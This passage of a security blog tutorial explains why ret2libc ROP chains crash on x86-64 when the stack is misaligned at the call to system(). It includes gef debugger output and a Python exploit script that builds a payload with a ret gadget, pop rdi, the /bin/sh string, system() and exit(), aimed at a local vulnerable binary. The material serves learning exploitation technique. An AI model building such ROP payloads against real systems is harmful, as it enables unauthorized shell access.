               ├────────────────────────────────────────────┤
               │    0x7fffffffdc30 →  &#34;/bin/sh&#34; string      │  ← popped into RDI
               ├────────────────────────────────────────────┤
               │    0x7fffffffdc38 →  system()              │  ← second RET jumps here
               ├────────────────────────────────────────────┤
               │    0x7fffffffdc40 →  exit()                │  ← system() returns here
  Low  addr →  └────────────────────────────────────────────┘
</code></pre><p>‍</p>
<p>I had some glitch in pwndbg, so i have shifted to gef.</p>
<p><img alt="image" loading="lazy" src="/blogs/the-stack-allignment-problem/image-20250614153331-p3b5nam.png"></p>
<p>‍</p>
<p><img alt="image" loading="lazy" src="/blogs/the-stack-allignment-problem/image-20250614153614-vox7o3o.png"></p>
<p>‍</p>
<pre tabindex="0"><code class="language-pgsql" data-lang="pgsql">rdi: 0x00007ffff7f50ea4  →  0x0068732f6e69622f (&#34;/bin/sh&#34;?)
</code></pre><p><img alt="image" loading="lazy" src="/blogs/the-stack-allignment-problem/image-20250614153727-ga806ic.png"></p>
<p>‍</p>
<p><strong>Calling System Function</strong></p>
<p><img alt="image" loading="lazy" src="/blogs/the-stack-allignment-problem/image-20250614154120-15gnfac.png"></p>
<pre tabindex="0"><code class="language-pgsql" data-lang="pgsql">$rip   : 0x00007ffff7dfc110  →  &lt;system+0000&gt; test rdi, rdi
</code></pre><p>‍</p>
<p>‍</p>
<p><img alt="image" loading="lazy" src="/blogs/the-stack-allignment-problem/image-20250614154156-fbg1crx.png"></p>
<p>‍</p>
<p><strong>Everything was fine until we got this</strong></p>
<p><img alt="image" loading="lazy" src="/blogs/the-stack-allignment-problem/image-20250614154401-sc849tw.png"></p>
<pre tabindex="0"><code class="language-pgsql" data-lang="pgsql"> ► 0x7ffff7dfbdf4 &lt;do_system+356&gt;    movaps xmmword ptr [rsp + 0x50], xmm0     &lt;[0x7fffffffd8e8] not aligned to 16 bytes&gt;
</code></pre><p>‍</p>
<p>I saw some of the articles on internet talking about this issue, I am sharing those here for your reference:</p>
<pre tabindex="0"><code class="language-ascii" data-lang="ascii">https://security.stackexchange.com/questions/278592/ret2libc-exploit-not-working-but-it-seems-correct-in-gdb#:~:text=There%20is%20a%20great%20chance,stack%20may%20not%20aligned%20propertly

https://c9x.me/compile/doc/abi.html#:~:text=The%20ABI%20is%20unclear%20on,0%20mod%2016

https://stackoverflow.com/questions/67243284/why-movaps-causes-segmentation-fault#:~:text=%3E%20MOVAPS%E2%80%94Move%20Aligned%20Packed%20Single,GP%29%20will%20be%20generated
</code></pre><p>‍</p>
<p>The key is that <strong>just before calling</strong> <strong>​<code>system()</code>​</strong> ​  <strong>(i.e. at the entry to</strong> <strong>​<code>system</code>​</strong>​ <strong>) the stack pointer</strong>  <strong>​<code>%rsp</code>​</strong>​ <strong>must satisfy the AMD64 ABI’s alignment requirements</strong>. By the AMD64 ABI, RSP must be <strong>16-byte aligned at every</strong> <strong>​<code>call</code>​</strong>​ <strong>instruction.</strong></p>
<p>‍</p>
<p><strong>Before any</strong> <strong>​<code>call</code>​</strong>​ <strong>instruction</strong>, <code>%rsp</code>​ <strong>must</strong> be a multiple of 16</p>
<blockquote>
<p>“Just before <code>call</code>​, <code>%rsp % 16 == 0</code>​​. On function entry, <code>%rsp % 16 == 8</code>​​.”</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-lua" data-lang="lua"><span class="line"><span class="cl"><span class="o">%</span><span class="n">rsp</span> <span class="err">≡</span> <span class="mi">0</span> <span class="n">mod</span> <span class="mi">16</span>   <span class="c1">----&gt;  rsp % 16 = 0</span>
</span></span></code></pre></div><p>The address of rsp should be the multiple of 16.</p>
<p>‍</p>
<p>Lets go the our Vulnerable Binary, run it again inside gdb.</p>
<p><img alt="image" loading="lazy" src="/blogs/the-stack-allignment-problem/image-20250619002842-wkfelpx.png">hit the breakpoint at the ret instruction.</p>
<p>​​</p>
<p>ret will take the address of  our gadget pop rdi ; ret and load it inside the rip</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mathematica" data-lang="mathematica"><span class="line"><span class="cl"><span class="n">gef</span><span class="err">➤</span><span class="w"> </span><span class="n">si</span><span class="w">
</span></span></span></code></pre></div><p><img alt="image" loading="lazy" src="/blogs/the-stack-allignment-problem/image-20250619003923-j4iqz3d.png"></p>
<p>‍</p>
<p><img alt="image" loading="lazy" src="/blogs/the-stack-allignment-problem/image-20250619003548-lfviv2n.png"></p>
<p>‍</p>
<p><strong>Remember that rule?</strong></p>
<blockquote>
<p>“Just before <code>call</code>​, <code>%rsp % 16 == 0</code>​​. On function entry, <code>%rsp % 16 == 8</code>​​.”</p>
</blockquote>
<p><img alt="image" loading="lazy" src="/blogs/the-stack-allignment-problem/image-20250619004408-4a7qs9c.png"></p>
<p>Just Before call, <code>%rsp % 16 == 0</code>​​ . but we are getting</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mathematica" data-lang="mathematica"><span class="line"><span class="cl"><span class="n">gef</span><span class="err">➤</span><span class="w">  </span><span class="o">!</span><span class="n">python3</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="err">&#39;</span><span class="n">print</span><span class="p">(</span><span class="mi">0</span><span class="n">x00007fffffffdd08</span><span class="w"> </span><span class="err">%</span><span class="w"> </span><span class="mi">16</span><span class="p">)</span><span class="err">&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">8</span><span class="w">
</span></span></span></code></pre></div><p>Now thats where the problem is.</p>
<p>‍</p>
<p><strong>Now we are at the entry of the system function</strong></p>
<blockquote>
<p>ABI expects &ndash; On function entry, <code>%rsp % 16 == 8</code>​​.</p>
<p>but we are getting <code>%rsp % 16 == 0</code>​​</p>
</blockquote>
<p><img alt="image" loading="lazy" src="/blogs/the-stack-allignment-problem/image-20250619005243-acxi4zk.png"></p>
<p>‍</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mathematica" data-lang="mathematica"><span class="line"><span class="cl"><span class="n">Correct</span><span class="w"> </span><span class="n">Stack</span><span class="w"> </span><span class="n">Alignment</span><span class="err">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">rsp</span><span class="w"> </span><span class="err">%</span><span class="w"> </span><span class="mi">16</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">8</span><span class="w">       </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">This</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">what</span><span class="w"> </span><span class="n">ABI</span><span class="w"> </span><span class="n">expects</span><span class="w"> </span><span class="n">after</span><span class="w"> </span><span class="err">&#39;</span><span class="n">call</span><span class="err">&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">system</span><span class="p">()</span><span class="w"> </span><span class="n">works</span><span class="w"> </span><span class="n">fine</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Misaligned</span><span class="w"> </span><span class="n">Stack</span><span class="err">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">rsp</span><span class="w"> </span><span class="err">%</span><span class="w"> </span><span class="mi">16</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w">       </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">Due</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">raw</span><span class="w"> </span><span class="n">ROP</span><span class="w"> </span><span class="n">chain</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">and</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">get</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">Movaps</span><span class="w"> </span><span class="n">issue</span><span class="w">
</span></span></span></code></pre></div><p>‍</p>
<p>When you normally call a function on x86_64, the hardware does two things under the hood:</p>
<ol>
<li>
<p>​<strong>​<code>call target</code>​</strong>​</p>
<ul>
<li>Pushes the <strong>return address</strong> (8 bytes) onto the stack</li>
<li>Decrements <code>rsp</code>​ by 8 (stack grows downward)</li>
<li>Jumps to <code>target</code>​</li>
</ul>
</li>
</ol>
<p>‍</p>
<blockquote>
<p><strong>Inside the callee</strong>, on entry you see <code>rsp % 16 == 8</code>​​ — exactly what the ABI expects.</p>
</blockquote>
<p>‍</p>
<p>However, in a ROP chain you don’t use <code>call</code>​; you stitch together a series of <strong>​<code>ret</code>​</strong>​ instructions instead. Each <code>ret</code>​ does:</p>
<ul>
<li>Pop the top 8 bytes from the stack into the instruction pointer</li>
<li>Increments <code>rsp</code>​ by 8 (stack “shrinks” upward)</li>
</ul>
<p>‍</p>
<p>Therefore, If you build a ROP chain without caring about alignment, each gadget’s <code>ret</code>​ will keep adding +8 to <code>rsp</code>​. By the time you hit <code>system()</code>​, your <code>rsp</code>​ can be at a multiple of 16 (i.e. <code>rsp % 16 == 0</code>​), which the ABI <strong>does not</strong> allow on function entry. Glibc then immediately executes a <code>movaps</code>​ on the (misaligned) stack and you get a General Protection Fault.</p>
<p>‍</p>
<p><img alt="image" loading="lazy" src="/blogs/the-stack-allignment-problem/image-20250619010638-pkl4ew5.png"></p>
<p>‍</p>
<p><img alt="image" loading="lazy" src="/blogs/the-stack-allignment-problem/image-20250619011149-g8u69fa.png"></p>
<p><strong>Updated Exploit</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mathematica" data-lang="mathematica"><span class="line"><span class="cl"><span class="n">File</span><span class="err">:</span><span class="w"> </span><span class="n">exploit</span><span class="err">.</span><span class="n">py</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="mi">1</span><span class="w">   </span><span class="err">│</span><span class="w"> </span><span class="n">import</span><span class="w"> </span><span class="n">struct</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="mi">2</span><span class="w">   </span><span class="err">│</span><span class="w"> </span><span class="nv">libc_base</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">x7ffff7da9000</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="mi">3</span><span class="w">   </span><span class="err">│</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">b</span><span class="s">&#34;A&#34;</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">8</span><span class="w">                                           </span><span class="nv">#</span><span class="w"> </span><span class="n">offset</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">rbp</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="mi">4</span><span class="w">   </span><span class="err">│</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">b</span><span class="s">&#34;B&#34;</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">8</span><span class="w">                                          </span><span class="nv">#</span><span class="w"> </span><span class="n">rbp</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="mi">5</span><span class="w">   </span><span class="err">│</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">struct</span><span class="err">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#34;&lt;Q&#34;</span><span class="p">,</span><span class="w"> </span><span class="nv">libc_base</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">0</span><span class="n">x00000000000f7bb3</span><span class="p">)</span><span class="w"> </span><span class="nv">#</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="mi">6</span><span class="w">   </span><span class="err">│</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">struct</span><span class="err">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#34;&lt;Q&#34;</span><span class="p">,</span><span class="w"> </span><span class="nv">libc_base</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">0</span><span class="n">x000000000002a145</span><span class="p">)</span><span class="w"> </span><span class="nv">#</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">rdi</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="mi">7</span><span class="w">   </span><span class="err">│</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">struct</span><span class="err">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#34;&lt;Q&#34;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="n">x7ffff7f50ea4</span><span class="p">)</span><span class="w">                 </span><span class="nv">#</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="mi">8</span><span class="w">   </span><span class="err">│</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">struct</span><span class="err">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#34;&lt;Q&#34;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="n">x7ffff7dfc110</span><span class="p">)</span><span class="w">                 </span><span class="nv">#</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">System</span><span class="w"> </span><span class="n">function</span><span class="p">()</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="mi">9</span><span class="w">   </span><span class="err">│</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">struct</span><span class="err">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#34;&lt;Q&#34;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="n">x7ffff7deb340</span><span class="p">)</span><span class="w">                 </span><span class="nv">#</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">exit</span><span class="w"> </span><span class="n">function</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="mi">10</span><span class="w">   </span><span class="err">│</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="mi">11</span><span class="w">   </span><span class="err">│</span><span class="w"> </span><span class="nv">#</span><span class="n">we</span><span class="w"> </span><span class="n">are</span><span class="w"> </span><span class="n">using</span><span class="w"> </span><span class="n">option</span><span class="w"> </span><span class="o">&lt;</span><span class="n">Q</span><span class="o">&gt;</span><span class="p">,</span><span class="w"> </span><span class="n">because</span><span class="w"> </span><span class="n">we</span><span class="w"> </span><span class="n">want</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">convert</span><span class="w"> </span><span class="n">these</span><span class="w"> </span><span class="mi">64</span><span class="w"> </span><span class="n">bit</span><span class="w"> </span><span class="n">addresses</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">little</span><span class="w"> </span><span class="n">endian</span><span class="w"> </span><span class="n">format</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="mi">12</span><span class="w">   </span><span class="err">│</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="mi">13</span><span class="w">   </span><span class="err">│</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="mi">14</span><span class="w">   </span><span class="err">│</span><span class="w"> </span><span class="nv">#</span><span class="w"> </span><span class="n">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="mi">15</span><span class="w">   </span><span class="err">│</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">open</span><span class="p">(</span><span class="s">&#34;exploit1&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;wb&#34;</span><span class="p">)</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">f</span><span class="err">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="mi">16</span><span class="w">   </span><span class="err">│</span><span class="w">     </span><span class="n">f</span><span class="err">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="mi">17</span><span class="w">   </span><span class="err">│</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="mi">18</span><span class="w">   </span><span class="err">│</span><span class="w"> </span><span class="n">print</span><span class="p">(</span><span class="s">&#34;Payload written to exploit1. Run with: `./vulnerable_program &lt; input.txt`&#34;</span><span class="p">)</span><span class="w">
</span></span></span></code></pre></div><p>‍</p>
<p>‍</p>
<p>Lets verify our exploit</p>
<p><img alt="image" loading="lazy" src="/blogs/the-stack-allignment-problem/image-20250619011556-78v07je.png"></p>
<p><img alt="image" loading="lazy" src="/blogs/the-stack-allignment-problem/image-20250619011932-m4z3440.png"></p>
<p>‍</p>
<p><img alt="image" loading="lazy" src="/blogs/the-stack-allignment-problem/image-20250619012146-bg66slu.png"></p>
<p><img alt="image" loading="lazy" src="/blogs/the-stack-allignment-problem/image-20250619012215-ofbgg3u.png"></p>
<p>So, hope you guys now have finally understood the stack allignment problem, and why use that extra ret gadget.</p>
<p>Happy hacking ;)</p>
<p>‍</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/blogs/process-explorer/">
    <span class="title">« Prev</span>
    <br>
    <span>Process Explorer</span>
  </a>
  <a class="next" href="http://localhost:1313/blogs/brbbot-analysis/">
    <span class="title">Next »</span>
    <br>
    <span>Analysing Brbbot</span>
  </a>
</nav>


<ul class="share-buttons">
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share The Stack allignment problem on x"
            href="https://x.com/intent/tweet/?text=The%20Stack%20allignment%20problem&amp;url=http%3a%2f%2flocalhost%3a1313%2fblogs%2fstack-allignment-problem%2f&amp;hashtags=">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share The Stack allignment problem on linkedin"
            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2flocalhost%3a1313%2fblogs%2fstack-allignment-problem%2f&amp;title=The%20Stack%20allignment%20problem&amp;summary=The%20Stack%20allignment%20problem&amp;source=http%3a%2f%2flocalhost%3a1313%2fblogs%2fstack-allignment-problem%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share The Stack allignment problem on reddit"
            href="https://reddit.com/submit?url=http%3a%2f%2flocalhost%3a1313%2fblogs%2fstack-allignment-problem%2f&title=The%20Stack%20allignment%20problem">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share The Stack allignment problem on facebook"
            href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fblogs%2fstack-allignment-problem%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share The Stack allignment problem on whatsapp"
            href="https://api.whatsapp.com/send?text=The%20Stack%20allignment%20problem%20-%20http%3a%2f%2flocalhost%3a1313%2fblogs%2fstack-allignment-problem%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share The Stack allignment problem on telegram"
            href="https://telegram.me/share/url?text=The%20Stack%20allignment%20problem&amp;url=http%3a%2f%2flocalhost%3a1313%2fblogs%2fstack-allignment-problem%2f">
            <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
                <path
                    d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share The Stack allignment problem on ycombinator"
            href="https://news.ycombinator.com/submitlink?t=The%20Stack%20allignment%20problem&u=http%3a%2f%2flocalhost%3a1313%2fblogs%2fstack-allignment-problem%2f">
            <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
                xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
                <path
                    d="M449.446 0C483.971 0 512 28.03 512 62.554L512 449.446C512 483.97 483.97 512 449.446 512L62.554 512C28.03 512 0 483.97 0 449.446L0 62.554C0 28.03 28.029 0 62.554 0L449.446 0ZM183.8767 87.9921H121.8427L230.6673 292.4508V424.0079H281.3328V292.4508L390.1575 87.9921H328.1233L256 238.2489z" />
            </svg>
        </a>
    </li>
</ul>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2026 <a href="http://localhost:1313/">Rahul Mishra</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu');
    if (menu) {
        
        const scrollPosition = localStorage.getItem("menu-scroll-position");
        if (scrollPosition) {
